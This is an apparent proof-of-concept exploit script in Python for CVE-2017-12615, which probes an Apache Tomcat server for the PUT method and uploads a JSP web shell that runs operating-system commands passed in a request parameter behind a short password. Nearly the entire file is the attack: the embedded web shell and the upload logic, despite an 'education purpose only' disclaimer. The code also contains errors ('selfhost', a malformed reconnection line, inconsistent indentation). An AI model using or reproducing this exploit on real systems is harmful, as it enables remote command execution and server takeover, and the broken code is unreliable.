#!/usr/bin/env python
#--*-- coding:utf-8 --*--
#__author__ == 'Kios'

import httplib

class PoC(object):
    '''
    CVE-2017-12615 PoC
    Education purpose only! Do not use illegal way!
    '''

    def __init__(self, host, port):
    	'''
		Initialize
    	'''
        self.host = host
        self.port = port
        self.body = """<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>"""
    
    def run(self):
    	'''
		Run 
    	'''
    	try:
    		conn = httplib.HTTPConnection(selfhost + ":" + str(self.port))
    		conn.request(method='OPTIONS', url ='/xxxx')
    		headers = dict(conn.getresponse().getheaders())

    		if 'allow' in headers and headers['allow'].find('PUT') > 0:
    			conn.close()
    			conn.httplib.HTTPConnection(selfhost + ":" + str(self.port))
    			url = '/evilCorp.jsp/'
    			conn.request(method='PUT', url=url, body=self.body)
    			res = conn.getresponse()

    			if res.status == 201:
    				print(">>> Server Vulnerable!")
    			elif res.status == 204:
    				print(">>> Server already existed!")
    			else:
    				print(">>> Error! ")
    		else:
    			print(">>> Server is not vulnerable")

    	except Exception as e:
    		print(">>> Exception countered!", str(e))


if __name__ == '__main__':
	obj1 = PoC('192.168.1.103', 8080)
	obj1.run()

